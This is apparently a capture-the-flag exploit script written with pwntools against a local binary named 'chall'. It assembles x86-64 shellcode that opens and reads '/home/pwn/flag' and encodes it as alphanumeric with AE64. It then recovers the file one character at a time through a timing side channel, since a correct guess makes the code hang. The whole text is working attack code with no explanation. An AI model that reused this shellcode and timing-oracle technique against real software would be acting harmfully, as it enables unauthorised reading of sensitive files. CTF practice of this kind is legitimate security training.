from ae64 import AE64
from pwn import *

context(os='linux',arch='amd64')


 
EXCV = context.binary = './chall'
e = ELF(EXCV)
def pwn(p, index, ch):
    # open
    shellcode = "push 0x101f2; pop rdi;  xor esi, esi; push 2; pop rax; syscall;"
    # re open, rax => 4
    shellcode += "push 2; pop rax; syscall;"
 
    # read(rax, 0x10040, 0x50)
    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10300; pop rsi; syscall;"
    
    # cmp and jz
    if index == 0:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(index, ch)
    else:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(index, ch)
 
    shellcode = asm(shellcode)
    shellcode = AE64().encode(shellcode,'rdx')
    payload = shellcode.ljust(0x200-14, b'a') + b'/home/pwn/flag'
    p.sendafter("?\n",payload)
 
index = 0
ans = []
while True:
    for ch in range(0x20, 127):
        p = process(EXCV)
        pwn(p, index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        if end-start > 1.5:
            ans.append(ch)
            print("".join([chr(i) for i in ans]))
            break
    else:
        print("".join([chr(i) for i in ans]))
        break
    index = index + 1
 
print("".join([chr(i) for i in ans]))
